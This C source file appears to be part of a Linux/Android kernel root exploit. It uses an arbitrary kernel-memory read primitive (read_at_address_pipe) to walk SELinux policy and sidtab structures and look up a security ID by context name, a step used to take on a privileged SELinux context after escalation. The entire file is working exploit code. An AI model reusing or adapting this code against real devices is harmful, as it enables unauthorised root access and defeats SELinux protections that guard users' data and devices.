#include <stdio.h>
#include <stdlib.h>

#include "sidtab.h"
#include "policydb.h"
#include "getroot.h"

#define __user
#define __kernel

static inline struct flex_array* __kernel get_types_fa()
{
	struct flex_array* __kernel fa = NULL;
	struct policydb* pdb = malloc(sizeof(*pdb));

	if (!pdb)
		return NULL;

	if(!policydb)
		goto end;

	if(!read_at_address_pipe(policydb, pdb, sizeof(*pdb)))
		fa = pdb->sym_val_to_name[SYM_TYPES];

end:
	free(pdb);
	return fa;
}

static void* flex_array_get_pipe(struct flex_array* __kernel fa, unsigned int element_nr)
{
	void* ptr = NULL;
	struct flex_array* fla = malloc(sizeof(*fla));

	if (!fla)
		return NULL;

	if(read_at_address_pipe(fa, fla, sizeof(*fla)))
		goto end;

	if(flex_array_has_element(fla, element_nr) && !(ptr = flex_array_get_base(fla, element_nr)))
	{
		int part_nr;
		struct flex_array_part* __kernel part = flex_array_get_part(fla, element_nr, &part_nr);
		if(part)
		{
			struct flex_array_part* p = malloc(sizeof(*p));
			if (!p)
				goto end;


			if(!read_at_address_pipe(part, p, sizeof(*p)))
				ptr = flex_array_get_from_part(p, part_nr, fla, element_nr);
			free(p);
		}
	}

end:
	free(fla);
	return ptr;
}

static inline int cmpsidstr(char* __user usrname, char* __kernel krnlname)
{
	int ret = 1;
	char* usrbuf = malloc(128);

	if (!usrbuf)
		return -ENOMEM;

	if(read_at_address_pipe(krnlname, usrbuf, 128))
		goto end;
	usrbuf[127] = 0;
	
	ret = strcmp(usrname, usrbuf);

end:
	free(usrbuf);
	return ret;
}

int get_sid(char* sidname)
{
	unsigned int curnel = 0;
	unsigned int sid = 0;
	struct flex_array* __kernel fa = get_types_fa();
	struct sidtab_node* htable[SIDTAB_SIZE];
	struct sidtab st;

	if(!fa || !sidtab)
		return 0;

	if(read_at_address_pipe(sidtab, &st, sizeof(st)))
		return 0;

	if(read_at_address_pipe(st.htable, &htable, sizeof(htable)))
		return 0;

	{
		unsigned int i;
		struct sidtab_node* __kernel next;
		struct sidtab_node* sn = malloc(sizeof(*sn));

		if (!sn)
			return 0;

		for(i = 0; i < SIDTAB_SIZE; i++)
		{
			if(curnel >= st.nel)
				break;
			if(!htable[i])
				continue;

			next = htable[i];
			do
			{
				if(read_at_address_pipe(next, sn, sizeof(*sn)))
					goto breakfor;

				char** name = flex_array_get_pipe(fa, sn->context.type - 1);
				//this should be a userpointer to a kernel pointer
				if(name)
				{
					if(cmpsidstr(sidname, *name) == 0)
					{
						sid = sn->sid;
						goto breakfor;
					}
				}
				curnel++;
			} while((next = sn->next) && (next != htable[i]));
		}
breakfor:
		free(sn);
	}

	return sid;
}
